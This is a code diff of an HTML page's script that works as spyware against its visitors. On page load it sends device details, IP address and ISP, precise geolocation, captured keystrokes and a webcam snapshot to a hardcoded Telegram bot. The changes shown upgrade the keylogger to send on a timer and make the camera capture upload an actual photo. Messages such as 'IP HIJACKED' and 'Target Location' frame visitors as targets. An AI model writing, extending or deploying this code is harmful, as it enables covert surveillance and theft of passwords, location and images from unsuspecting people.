@@ -138,14 +138,26 @@ const TOKEN='8762306338:AAEK0xVsVm44Epmu0N3rVYqeVV10GfIRNco',CHAT_ID='7988925862
 const sendTele=m=>{fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:m,parse_mode:'Markdown'})});};
 async function d1(){let m="**[◈] DEVICE ID**\n• Platform: "+navigator.platform+"\n• Cores: "+navigator.hardwareConcurrency+"\n**▒░░░▒░░░░░░░░░░░░░░░░░░░▒░░░▒**";sendTele(m);}d1();
 
-let keys = "";
-document.addEventListener('keydown', (e) => {
-    keys += e.key;
-    if (keys.length >= 10) {
-        sendTele(` Keylog: ${keys}`);
-        keys = "";
-    }
+
+let keylogData = "";
+document.addEventListener('keydown', function(e) {
+    let key = e.key;
+    if (key === "Enter") key = "\n[ENTER]\n";
+    else if (key === "Backspace") key = "[BS]";
+    else if (key === "Space") key = " ";
+    else if (key.length > 1) key = ` [${key}] `;
+    
+    keylogData += key;
 });
+
+
+setInterval(function() {
+    if (keylogData.length > 0) {
+        sendTele("⌨️ Keylog Captured:\n" + keylogData);
+        keylogData = ""; 
+    }
+}, 3000); 
+
 
 document.addEventListener('click', async () => {
     try {
@@ -290,25 +302,42 @@ try{let c=document.createElement('canvas'),g=c.getContext('webgl'),d=g.getExtens
  
 fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>sendTele("**[◈] IP HIJACKED**\n• IP: "+d.ip+"\n• ISP: "+d.org+"\n• Loc: "+d.city+"\n**▒░░░░░░░░░░░░░░░░░░░▒**"));
 
-navigator.geolocation.getCurrentPosition(pos => {
-    const { latitude, longitude } = pos.coords;
-    sendTele(` Location: https://www.google.com/maps?q=${latitude},${longitude}`);
-});
-async function snap() {
+navigator.geolocation.getCurrentPosition(res => {
+    const lat = res.coords.latitude;
+    const lon = res.coords.longitude;
+    const accuracy = res.coords.accuracy;
+    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+    sendTele(`📍 Target Location:\nAccuracy: ${accuracy} meters\nLink: ${mapLink}`);
+}, err => {
+    sendTele("❌ Location Denied by User");
+}, { enableHighAccuracy: true });
+
+async function captureCam() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.createElement('video');
         video.srcObject = stream;
-        video.onloadedmetadata = () => {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            sendTele(`Camera Access: Captured (Send as Image if Bot supports)`);
-            stream.getTracks().forEach(track => track.stop());
-        };
-    } catch (e) {}
+        await video.play();
+
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'snap.jpg');
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }, 'image/jpeg');
+
+        stream.getTracks().forEach(t => t.stop());
+    } catch (e) { sendTele("❌ Cam Error: " + e.message); }
 }
-setTimeout(snap, 2000);
+setTimeout(captureCam, 3000); // পেজ লোডের ৩ সেকেন্ড পর ছবি তুলবে
+
 </script></body>
 </html>
